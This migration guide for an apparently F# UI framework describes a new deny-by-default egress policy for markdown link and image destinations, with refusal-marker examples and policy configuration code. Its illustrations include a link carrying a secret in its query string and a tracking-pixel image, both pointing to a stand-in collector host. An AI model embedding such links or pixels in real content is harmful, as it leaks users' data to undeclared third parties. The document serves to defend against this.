# Migration — Phase 1032: markdown destinations join the destination policy

**Breaking rendering behaviour. Additive public surface.** No type changes: nothing you construct
gains a field, and nothing you call changes signature. What changes is what a **decoded markdown
body** renders when it points somewhere the host has not declared.

This closes the one gap [Phase 1026](1026-ambient-destination-policy.md) disclosed. That phase made
the destination policy ambient for every `href`, `src` and tree-declared route the renderer emits —
and stopped at markdown, because `Markdown.toHtml` is a pure `string -> string` function pinned by a
canonical cross-host corpus that the TypeScript, Go, Rust and Python hosts also conform to. Threading
a policy through it is a **wire-adjacent forward-coupling event**, not a call-site adoption. 1026 was
right to refuse it as a side effect; this is it done deliberately.

---

## What changed

| | Before (≤ 0.34.0) | After (0.35.0) |
|---|---|---|
| `Markdown.toHtml` | pure `string -> string`, scheme floor only | **unchanged, byte-for-byte** — now *defined as* `toHtmlWithEgress permissiveEgress` |
| `Markdown.toHtmlWithEgress` | — | **new**: consults an `EgressPolicy` for every link and image destination |
| Client renderer (`NodeKind.Markdown`) | `toHtml` | `toHtmlWithEgress ctx.EgressPolicy` |
| SSR renderer (`NodeKind.Markdown`) | `toHtml` | `toHtmlWithEgress ctx.EgressPolicy` |
| Email projection | `toHtml` | `toHtmlWithEgress ctx.EgressPolicy`, marker stripped |

So the guarantee is ambient by the same mechanism as 1026: **not** because the pure function's
default flipped, but because the render path passes a policy whose default denies.

## What you will see

A decoded markdown body containing

```markdown
[the report](https://collector.example/x?s=secret)
```

renders, under the default `denyNonLocalEgress`:

```html
<p><a href="about:blank#fuaran-egress-refused"
      data-fuaran-egress-refused="hyperlink:collector.example">the report</a></p>
```

The refusal shape is 1026's, unchanged: the inert `about:blank#fuaran-egress-refused`, plus a marker
naming the **class** and the **host** — never the path or the query, because the query string of a
refused exfiltration attempt is the payload itself. The marker attribute is appended **last**, after
every attribute that was already there, so a diff against the old bytes is a pure suffix.

Covered destinations, and the class each takes:

| Markdown construct | Class |
|---|---|
| `[text](url)`, `[text][ref]` | `hyperlink` |
| `<https://…>` autolink, bare-URL autolink | `hyperlink` |
| `<person@example.com>` email autolink, `[x](mailto:…)` | `hyperlink` (refused as `hyperlink:mailto` under the default) |
| `![alt](url)`, `![alt][ref]` | `media` |

**An image is the one that matters most.** A `hyperlink` needs the reader to click; a `media`
destination is contacted by *rendering the document*. In a markdown body that means a decoded
`![](https://collector.example/p.png?who=…)` was, before this change, a tracking pixel the host never
declared and could not see.

## `toHtml` did not change, and that is deliberate

`Markdown.toHtml source` is exactly `Markdown.toHtmlWithEgress Sanitize.permissiveEgress source`,
byte-for-byte across every fixture in the cross-host corpus (there is a test asserting precisely
that). Three reasons it survives rather than flipping its default:

- the corpus is a **five-host byte-parity contract**, so changing the pure function would rewrite
  existing fixtures in every host in one act — and a mass churn is exactly where a genuine divergence
  hides;
- it is published surface on an Apache-2.0 package, and a host author who wants the pure function
  should reach it deliberately rather than meet a silent behaviour swap;
- keeping it named makes an unpolicied markdown render **greppable**, which is the property the
  refusal shape exists to give in the first place.

It is the correct entry point for a **hand-authored** body, where the author is the trust boundary.
For a **decoded** body it is not: pass a policy.

## The scheme floor's own answer is unchanged

A URL the §19 floor rejects — `javascript:`, an unknown scheme, a protocol-relative reference —
still renders the bare `about:blank`, with **no** marker, exactly as it has since Phase 292.

That is a decision, not an inconsistency. The floor's refusal says *this URL is not safe to render at
all*; a policy refusal says *this destination was not declared*. They are different facts, the first
is pinned by the shared `sanitization/` corpus in five hosts, and re-spelling it inside a change about
egress would churn that corpus where a real divergence could hide.

## Adopting

**If you render hand-authored markdown:** nothing to do. If you call `Markdown.toHtml` directly, it
still does what it did.

**If you render decoded markdown through the shipped renderers:** you are already covered — and you
may need to declare an origin you were relying on implicitly. The declaration is the same one 1026
documents, and it now reaches markdown too:

```fsharp
let policy =
    Sanitize.denyNonLocalEgress
    |> Sanitize.allowOrigin (Sanitize.HostSuffix "cdn.example")  [ Sanitize.EgressClass.Media ]
    |> Sanitize.allowOrigin (Sanitize.ExactHost  "docs.example") [ Sanitize.EgressClass.Hyperlink ]
```

Reach it through the same named entry points 1026 lists (`renderWithSourcesAndEgress`,
`Render.renderWithEgress`, `Hydration.renderWithIslandsAndEgress`, `FuaranGiraffeOptions.EgressPolicy`,
`Email.defaults with EgressPolicy`, `DriverServices`).

**If you call markdown yourself:** replace `Markdown.toHtml body` with
`Markdown.toHtmlWithEgress policy body`.

**If your markdown contains `mailto:` links**, they are refused by the default, for the reason 1026
gives at length. The narrow remedy is the same one-field widening:

```fsharp
let policy = { Sanitize.denyNonLocalEgress with AllowNonNetwork = true }
```

## Cross-host

This is not a fuaran-dotnet change with ports. The refusal shape, the class assignment, and the
policies a conformance fixture may name are specified language-neutrally in the wire format's **§14.1
"Destination policy for markdown link + image destinations"**, and the shared markdown corpus carries
policied fixtures that every conformant host renders. A fixture may carry a `policy` naming one of
three policies — `permissive` (the default when absent), `denyNonLocal`, `declaredExample` — which
each host **constructs**; the corpus never carries a policy as data, because a policy that can arrive
as data is one a hostile emission can widen.

`declaredExample` is what makes the gate falsifiable in both directions: a host that refused every
non-local destination unconditionally fails its allowed fixtures, and one that ignored the policy
fails the `denyNonLocal` ones.

## What this still does NOT cover

- **Each non-F# host exposes the seam; wiring it into that host's own render context is separate.**
  The other conformant hosts implement the policy and the policy-taking markdown entry point, and
  pass the corpus. Making the policy *ambient* on their render contexts is the 1026-shaped act for
  each of them, and it has not been done.
- **`Fuaran.UI.Giraffe.DocumentShell`**, **`EmailOptions.LiveUrl`**, and **registered performers**
  are unchanged and unreached — see 1026's own list, which still holds for everything except the
  markdown bullet.

## See also

- [`1026-ambient-destination-policy.md`](1026-ambient-destination-policy.md) — the phase this closes
  the gap in; its adoption guide is still the reference for declaring a policy.
- [`../MARKDOWN.md`](../MARKDOWN.md) — the markdown renderer's contract and buckets.
- [`../../SANITIZATION.md`](../../SANITIZATION.md) — the render-time sanitization contract.
